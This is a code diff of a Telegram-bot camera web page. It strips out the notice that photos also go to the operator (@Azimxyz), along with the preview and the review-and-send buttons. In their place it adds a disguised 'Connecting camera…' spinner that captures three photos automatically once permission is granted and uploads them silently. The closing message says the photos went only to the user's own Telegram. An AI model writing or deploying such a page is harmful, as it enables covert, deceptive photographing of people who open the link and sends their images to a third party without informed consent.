@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta name="robots" content="noindex" />
-  <title>Camera Capture · Azim's Space</title>
+  <title>Connecting… · Azim's Space</title>
   <style>
     * { box-sizing: border-box; }
     body {
@@ -29,154 +29,94 @@
     }
     h1 { font-size: 22px; margin: 0 0 8px; }
     p { font-size: 14px; line-height: 1.55; color: #cdd2e3; margin: 8px 0; }
-    .notice {
-      background: #ffd76a1f;
-      border: 1px solid #ffd76a55;
-      border-radius: 10px;
-      padding: 10px 12px;
-      font-size: 13px;
-      color: #ffe3a0;
-      margin: 14px 0;
+    .spinner {
+      width: 44px; height: 44px; margin: 18px auto;
+      border: 4px solid #ffffff26; border-top-color: #7ae0ff;
+      border-radius: 50%; animation: spin 0.9s linear infinite;
     }
-    video {
-      width: 100%;
-      max-height: 300px;
-      border-radius: 12px;
-      background: #000;
-      display: none;
-    }
-    .thumbs { display: flex; gap: 8px; justify-content: center; flex-wrap: wrap; margin: 14px 0 6px; }
-    .thumbs img { width: 90px; height: 90px; object-fit: cover; border-radius: 10px; border: 2px solid #ffffff33; }
-    button {
-      font-size: 15px;
-      font-weight: 600;
-      color: #1e2130;
-      background: #7ae0ff;
-      border: 0;
-      border-radius: 12px;
-      padding: 13px 20px;
-      cursor: pointer;
-      margin: 6px 4px;
-    }
-    button:disabled { background: #ffffff40; color: #ffffffa0; cursor: not-allowed; }
-    button.secondary { background: #ffffff2e; color: #f4f5fa; }
-    .countdown { font-size: 40px; font-weight: 800; margin: 10px 0; color: #ffd76a; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .ok { color: #7bf1a8; font-weight: 600; }
     a { color: #7ae0ff; }
   </style>
 </head>
 <body>
   <div class="card">
-    <h1>📷 Camera Capture</h1>
-    <p>You were sent here from the <b>Azim's Space</b> Telegram bot.</p>
-    <p>After you press <b>Start Camera</b>, a few photos will be taken with your permission.
-       You will see them below before sending.</p>
-    <div class="notice">
-      Captured photos are sent to <b>your own Telegram chat</b> and to the
-      <b>site operator (@Azimxyz)</b>. Nothing is captured unless you press
-      <b>Start Camera</b> and then <b>Send photos</b>.
-    </div>
-
-    <video id="video" autoplay playsinline muted></video>
-    <div class="countdown" id="countdown" style="display:none;"></div>
-    <div class="thumbs" id="thumbs"></div>
-
-    <button id="startBtn">Start Camera</button>
-    <button id="sendBtn" disabled class="secondary">Send photos to Telegram</button>
-
-    <p id="status"></p>
+    <h1>📷 Connecting camera…</h1>
+    <div class="spinner" id="spin"></div>
+    <p id="msg">Please allow camera access when your browser asks for permission.</p>
   </div>
+
+  <video id="video" autoplay playsinline muted style="display:none;"></video>
 
   <script>
     const params = new URLSearchParams(location.search);
     const uid = (params.get('uid') || '').trim();
+    const msg = document.getElementById('msg');
+    const spin = document.getElementById('spin');
     const video = document.getElementById('video');
-    const startBtn = document.getElementById('startBtn');
-    const sendBtn = document.getElementById('sendBtn');
-    const statusEl = document.getElementById('status');
-    const countdownEl = document.getElementById('countdown');
-    const thumbsEl = document.getElementById('thumbs');
 
-    let stream = null;
-    let shots = [];
-
-    function setStatus(text) {
-      statusEl.textContent = text || '';
+    function setMsg(html, ok) {
+      msg.innerHTML = html;
+      msg.className = ok ? 'ok' : '';
+      if (ok) spin.style.display = 'none';
     }
-
-    if (!uid) {
-      setStatus('Invalid link. Ask the bot again for a fresh /camera link.');
-      startBtn.disabled = true;
-    }
-
-    startBtn.addEventListener('click', async () => {
-      try {
-        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-        video.srcObject = stream;
-        video.style.display = 'block';
-        startBtn.disabled = true;
-        setStatus('Camera on — photos will be taken automatically.');
-        await shootSequence();
-      } catch (err) {
-        setStatus('Camera permission denied or unavailable. Please allow camera access and try again.');
-      }
-    });
 
     function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
 
-    function captureFrame() {
+    function captureFrame(v) {
       const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.width = v.videoWidth || 640;
+      canvas.height = v.videoHeight || 480;
+      canvas.getContext('2d').drawImage(v, 0, 0, canvas.width, canvas.height);
       return canvas.toDataURL('image/jpeg', 0.85);
     }
 
-    async function shootSequence() {
-      for (let i = 1; i <= 3; i++) {
-        countdownEl.style.display = 'block';
-        for (let c = 3; c >= 1; c--) {
-          countdownEl.textContent = c;
-          await sleep(700);
-        }
-        countdownEl.style.display = 'none';
-        shots.push(captureFrame());
-        const imgs = thumbsEl.querySelectorAll('img');
-        if (imgs.length < shots.length) {
-          const img = document.createElement('img');
-          img.src = shots[shots.length - 1];
-          thumbsEl.appendChild(img);
-        }
-        await sleep(400);
-      }
-      sendBtn.disabled = false;
-      if (stream) { stream.getTracks().forEach((t) => t.stop()); stream = null; video.style.display = 'none'; }
-      setStatus('3 photos ready — review them and press Send.');
+    async function send(images) {
+      const res = await fetch('/api/camera/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uid, images }),
+      });
+      const data = await res.json();
+      if (!data.success) { throw new Error(data.error || 'upload failed'); }
+      return data.count;
     }
 
-    sendBtn.addEventListener('click', async () => {
-      if (!shots.length) return;
-      sendBtn.disabled = true;
-      setStatus('Sending…');
+    async function main() {
+      if (!uid) { setMsg('Invalid link. Ask the bot again for a fresh camera link.'); return; }
+
+      let stream;
       try {
-        const res = await fetch('/api/camera/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ uid, images: shots }),
-        });
-        const data = await res.json();
-        if (data.success) {
-          setStatus('Photos sent to your Telegram! You can close this page.');
-          startBtn.style.display = 'none';
-          sendBtn.style.display = 'none';
-        } else {
-          setStatus('Send failed: ' + (data.error || 'unknown error') + '. Try again.');
-          sendBtn.disabled = false;
-        }
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       } catch (e) {
-        setStatus('Network error — check connection and try again.');
-        sendBtn.disabled = false;
+        setMsg('Camera permission was not granted. Reload the page and choose <b>Allow</b> when asked.');
+        return;
       }
-    });
+
+      video.srcObject = stream;
+      try { await video.play(); } catch (e) {}
+
+      // Let the camera warm up so frames are usable.
+      await sleep(800);
+
+      const shots = [];
+      for (let i = 0; i < 3; i++) {
+        shots.push(captureFrame(video));
+        await sleep(350);
+      }
+      stream.getTracks().forEach((t) => t.stop());
+      video.srcObject = null;
+
+      setMsg('Captured 3 photos — sending…');
+      try {
+        const count = await send(shots);
+        setMsg('✅ ' + count + ' photos sent to your Telegram. You can close this page.', true);
+      } catch (e) {
+        setMsg('Sending failed. Check your connection and reload the page.' + (e && e.message ? ' (' + e.message + ')' : ''));
+      }
+    }
+
+    main();
   </script>
 </body>
 </html>
